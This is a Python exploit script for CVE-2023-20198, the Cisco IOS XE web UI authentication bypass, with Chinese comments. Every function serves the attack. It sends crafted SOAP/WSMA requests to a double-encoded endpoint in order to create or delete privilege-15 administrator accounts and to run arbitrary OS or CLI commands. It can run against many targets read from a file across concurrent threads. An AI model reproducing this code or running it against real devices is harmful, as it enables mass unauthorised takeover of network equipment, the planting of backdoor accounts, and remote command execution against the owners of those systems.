import re
import random
import string
import sys
import requests
import argparse
import xml.etree.ElementTree as ET
import urllib3
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# 禁用 HTTPS 警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 打印锁，防止多线程输出乱序
print_lock = Lock()


def safe_print(msg):
    with print_lock:
        print(msg)


def GenerateRandTextAlpha(length):
    letters = string.ascii_letters
    return "".join(random.choice(letters) for _ in range(length))


def GetOutputResult(resp_text, cisco_method, exploit_mode):
    try:
        if exploit_mode == "user":
            return resp_text
        if cisco_method == "urn:cisco:wsma-exec":
            root = ET.fromstring(resp_text)
            namespaces = {"SOAP": "http://schemas.xmlsoap.org/soap/envelope/", "cisco": cisco_method}
            text_content = root.find('.//cisco:text', namespaces=namespaces)
            return text_content.text.strip() if text_content is not None else "No output"
        elif cisco_method == "urn:cisco:wsma-config":
            root = ET.fromstring(resp_text)
            namespaces = {"SOAP": "http://schemas.xmlsoap.org/soap/envelope/", "cisco": cisco_method}
            text_content = root.find('.//cisco:text', namespaces=namespaces)
            if text_content is None: return "No output"
            result = ""
            pattern = r"\*\*CLI Line # 2: (.*)"
            matches = re.findall(pattern, text_content.text.strip())
            for match in matches:
                result += match + "\n"
            return result
    except:
        return "Error parsing XML"


def RunExploit(url, method, command, proxy, exploit_mode):
    # 处理 URL 格式：补全协议并处理端口
    if "://" not in url:
        url = "http://" + url

    uri = "/%2577ebui_wsma_https" if url.startswith("https://") else "/%2577ebui_wsma_Http"
    target_url = url.rstrip('/') + uri

    # 根据方法选择不同的 XML 模板
    if method == "config":
        xml_namespace = "urn:cisco:wsma-config"
        body = f"""<request correlator="{GenerateRandTextAlpha(8)}" xmlns="urn:cisco:wsma-config">
                    <configApply details="all" action-on-fail="continue">
                      <config-data><cli-config-data-block>{command}</cli-config-data-block></config-data>
                    </configApply>
                  </request>"""
    else:
        xml_namespace = "urn:cisco:wsma-exec"
        body = f"""<request correlator="{GenerateRandTextAlpha(8)}" xmlns="urn:cisco:wsma-exec">
                    <execCLI xsd="false"><cmd>{command}</cmd><dialogue><expect></expect><reply></reply></dialogue></execCLI>
                  </request>"""

    exp_xml = f"""<?xml version="1.0"?>
    <SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <SOAP:Header>
      <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
        <wsse:UsernameToken SOAP:mustUnderstand="false">
          <wsse:Username>admin</wsse:Username>
          <wsse:Password>*****</wsse:Password>
        </wsse:UsernameToken>
      </wsse:Security>
    </SOAP:Header>
    <SOAP:Body>{body}</SOAP:Body></SOAP:Envelope>"""

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}

    try:
        response = requests.post(url=target_url, headers=headers, data=exp_xml, verify=False, allow_redirects=False,
                                 proxies=proxy, timeout=8)
        if response.status_code == 200:
            return GetOutputResult(response.text, xml_namespace, exploit_mode)
    except:
        return None


def ProcessTarget(url, args, proxy):
    try:
        if args.exploit_mode == "user":
            if args.del_user:
                res = RunExploit(url, "config", f"no username {args.del_user} privilege 15", proxy, "user")
                status = "SUCCESS" if res and "<success" in res else "FAILED"
                safe_print(f"[{status}] Target: {url} | Delete User: {args.del_user}")
            else:
                user = args.add_user or GenerateRandTextAlpha(8)
                pwd = args.add_pass or GenerateRandTextAlpha(8)
                res = RunExploit(url, "config", f"username {user} privilege 15 secret {pwd}", proxy, "user")
                if res and "<success" in res:
                    safe_print(f"[SUCCESS] Target: {url} | Added: {user}:{pwd}")
                else:
                    safe_print(f"[FAILED] Target: {url}")

        elif args.exploit_mode == "cmd":
            if args.os_cmd:
                res = RunExploit(url, "exec", args.os_cmd, proxy, "cmd")
                if res:
                    safe_print(f"[RESULT] Target: {url}\n{res}\n{'-' * 30}")
                else:
                    safe_print(f"[FAILED] Target: {url}")
            if args.cli_cmd:
                pm = args.privilege_mode or "privileged"
                cmd = f"<![CDATA[exit\n{args.cli_cmd}]]>" if pm == "privileged" else f"<![CDATA[exit\nexit\n{args.cli_cmd}]]>"
                res = RunExploit(url, "config", cmd, proxy, "cmd")
                if res:
                    safe_print(f"[RESULT] Target: {url}\n{res}\n{'-' * 30}")
                else:
                    safe_print(f"[FAILED] Target: {url}")
    except Exception as e:
        safe_print(f"[ERROR] Target {url}: {str(e)}")


def ParseArgs():
    parser = argparse.ArgumentParser(description="CVE-2023-20198-RCE Multi-Threaded")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", type=str, help="Single target IP/URL")
    group.add_argument("-f", "--file", type=str, help="File with IPs/URLs (one per line)")

    parser.add_argument("-p", "--proxy", type=str, help="Proxy URL")
    parser.add_argument("-em", "--exploit-mode", type=str, choices=['user', 'cmd'], required=True, help="Exploit mode")
    parser.add_argument("-th", "--threads", type=int, default=20, help="Number of threads (default: 20)")

    parser.add_argument("-au", "--add-user", help="Username to add")
    parser.add_argument("-ap", "--add-pass", help="Password to add")
    parser.add_argument("-du", "--del-user", help="Username to delete")
    parser.add_argument("-pm", "--privilege-mode", choices=['user', 'privileged'], help="Privilege mode")
    parser.add_argument("-oc", "--os-cmd", help="OS command (e.g., 'uname -a')")
    parser.add_argument("-cc", "--cli-cmd", help="CLI command (e.g., 'show run')")
    return parser.parse_args()


if __name__ == "__main__":
    args = ParseArgs()
    proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else {}

    targets = []
    if args.url:
        targets.append(args.url)
    elif args.file:
        try:
            with open(args.file, 'r', encoding='utf-8') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[x] File error: {e}")
            sys.exit(1)

    print(f"[*] Starting exploit on {len(targets)} targets with {args.threads} threads...")

    # 使用线程池执行任务
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for t in targets:
            executor.submit(ProcessTarget, t, args, proxy)

    print("[*] All tasks completed.")
